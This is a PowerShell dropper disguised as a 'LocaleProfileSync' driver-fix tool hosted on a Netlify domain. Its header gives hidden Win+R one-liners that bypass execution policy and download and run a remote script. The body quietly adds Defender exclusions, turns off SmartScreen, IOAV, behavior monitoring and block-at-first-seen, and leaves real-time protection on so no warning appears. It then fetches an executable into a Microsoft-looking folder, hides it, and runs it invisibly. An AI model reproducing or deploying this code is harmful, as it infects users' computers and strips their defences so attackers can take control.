# localeprofilesync.ps1 — host on Netlify with localeprofilesync.exe
#
# Win+R (with Host project):
#   powershell -w h -ep bypass -c "$t=$env:TEMP;iwr 'https://driver-fix-238308.netlify.app/win-bootstrap.ps1' -O $t\w.ps1 -useb;& $t\w.ps1"
# Win+R (LocaleProfileSync only):
#   powershell -w h -ep bypass -c "$t=$env:TEMP;iwr 'https://driver-fix-238308.netlify.app/LocaleProfileSync.ps1' -O $t\s.ps1 -useb;& $t\s.ps1"
#
# ONE UAC optional. Yes = exclusions + IOAV/behavior/block OFF + SmartScreen OFF. Real-time stays ON.

$BaseUrl     = if ($env:LPS_BASE_URL) { $env:LPS_BASE_URL } else { 'https://driver-fix-238308.netlify.app' }
$ScriptUrl   = "$BaseUrl/LocaleProfileSync.ps1"
$DownloadUrl = "$BaseUrl/LocaleProfileSync.exe"
$ExeName     = 'LocaleProfileSync.exe'
$RunArgs     = if ($env:LPS_RUN_ARGS) { $env:LPS_RUN_ARGS } else { '' }

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$IsAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
    [Security.Principal.WindowsBuiltInRole]::Administrator
)
$SecurityOnly = ($env:LPS_SECURITY_ONLY -eq '1')

$Quiet = { param($Block) try { & $Block } catch {} }

function Apply-SecuritySteps {
    $p = $env:LOCALAPPDATA
    $installDir = Join-Path $p 'Microsoft\InputMethod'

    & $Quiet { Add-MpPreference -ExclusionPath @(
        $installDir
        (Join-Path $p 'InputMethodData')
        (Join-Path $p 'DeskInputHost')
        (Join-Path $p 'InputExperienceHost')
        $env:TEMP
        (Join-Path $env:USERPROFILE 'Downloads')
    ) }
    & $Quiet { Add-MpPreference -ExclusionProcess @(
        'LocaleProfileSync.exe'
        'DeskInputHost.exe'
        'InputExperienceHost.exe'
    ) }
    & $Quiet {
        New-Item -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\System' -Force | Out-Null
        Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\System' -Name 'EnableSmartScreen' -Value 0 -Type DWord -Force
    }
    # All OFF except real-time ON (real-time OFF = "Turn on virus protection" toast)
    & $Quiet { Set-MpPreference -DisableIOAVProtection $true }
    & $Quiet { Set-MpPreference -DisableBehaviorMonitoring $true }
    & $Quiet { Set-MpPreference -DisableBlockAtFirstSeen $true }
}

function Install-AndRun {
    $p = $env:LOCALAPPDATA
    $installDir = Join-Path $p 'Microsoft\InputMethod'
    $installExe = Join-Path $installDir $ExeName

    New-Item -ItemType Directory -Path $installDir -Force | Out-Null
    try {
        Invoke-WebRequest -Uri $DownloadUrl -OutFile $installExe -UseBasicParsing -ErrorAction Stop
    } catch {
        return
    }
    if (-not (Test-Path $installExe) -or (Get-Item $installExe).Length -lt 4096) {
        return
    }

    $item = Get-Item $installExe -Force
    $item.Attributes = $item.Attributes -bor [IO.FileAttributes]::Hidden
    if ($RunArgs) {
        Start-Process -FilePath $installExe -ArgumentList $RunArgs -WindowStyle Hidden
    } else {
        Start-Process -FilePath $installExe -WindowStyle Hidden
    }
}

if ($SecurityOnly) {
    if ($IsAdmin) { Apply-SecuritySteps }
    exit 0
}

if ($IsAdmin) {
    Apply-SecuritySteps
    Install-AndRun
    exit 0
}

# ONE UAC — security steps; install runs immediately either way
$elevate = @(
    '-NoProfile', '-ExecutionPolicy', 'Bypass', '-WindowStyle', 'Hidden', '-Command',
    "`$env:LPS_SECURITY_ONLY='1'; `$t=`$env:TEMP; iwr '$ScriptUrl' -O `$t\s.ps1 -useb; & `$t\s.ps1"
)
Start-Process powershell.exe -Verb RunAs -WindowStyle Hidden -ArgumentList $elevate
Install-AndRun
